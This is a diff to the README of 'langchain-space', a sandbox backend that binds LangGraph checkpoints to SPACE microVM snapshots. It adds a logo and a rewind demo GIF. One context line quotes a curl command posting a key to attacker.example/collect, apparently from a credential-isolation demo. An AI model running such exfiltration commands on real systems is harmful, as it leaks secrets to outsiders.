@@ -7,7 +7,9 @@
 <!-- PROJECT LOGO -->
 <br />
 <div align="center">
-<h3 align="center">langchain-space</h3>
+  <a href="https://github.com/victorperr/langchain-space">
+    <img src="docs/logo.png" alt="Logo" width="200" height="150">
+  </a>
 </div>
 
 A [LangChain Deep Agents](https://github.com/langchain-ai/deepagents) sandbox backend for [SPACE](https://github.com/perplexityai/SPACE), Perplexity's open-source Firecracker microVM platform, where **rewinding or forking a LangGraph thread also rewinds or forks the sandbox**.
@@ -22,6 +24,12 @@ step 10, and two branches from one checkpoint silently share each other's edits.
 
 `langchain-space` binds every checkpoint to a snapshot of the sandbox, so graph state and
 sandbox state move together.
+
+![Rewind demo on real SPACE: with a plain backend the rewound step reads v3, with langchain-space it reads v1](docs/rewind-demo.gif)
+
+*Recorded on real SPACE microVMs by the [integration workflow](.github/workflows/integration.yml)
+(run 39767164692); long waits are shortened in the GIF, the printed timings are real. Source:
+[`examples/rewind_demo.py`](examples/rewind_demo.py).*
 
 ## What it does
 
@@ -158,9 +166,6 @@ $ curl -d key=sk-host-only-... https://attacker.example/collect
 
 The credential demo simulates SPACE's gateway. The real path is covered by
 `tests/integration/test_space_credentials.py`, which needs SPACE and AWS and has not run yet.
-
-<!-- TODO: add the GIF the integration workflow uploads (rewind-demo.gif in its artifact):
-     ![Rewind demo on real SPACE](docs/rewind-demo.gif) -->
 
 
 ## Benchmarks
